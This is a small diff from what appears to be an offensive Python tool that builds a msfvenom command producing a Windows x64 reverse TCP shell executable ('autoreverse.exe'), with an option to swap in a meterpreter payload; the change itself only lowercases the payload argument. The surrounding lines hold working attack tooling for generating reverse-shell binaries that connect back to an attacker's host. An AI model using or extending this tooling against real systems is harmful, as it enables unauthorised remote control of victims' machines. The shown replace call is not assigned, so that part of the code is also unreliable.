@@ -59,6 +59,7 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
     if payload.isnumeric():
         print(red('The payload must be a string.'))
         exit()
+    payload = payload.lower()
     msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + IP + ' LPORT=' + PORT + ' -f exe > autoreverse.exe 2>/dev/null'
     if msf == 1:
         msfvenom.replace('shell_', 'meterpreter/')
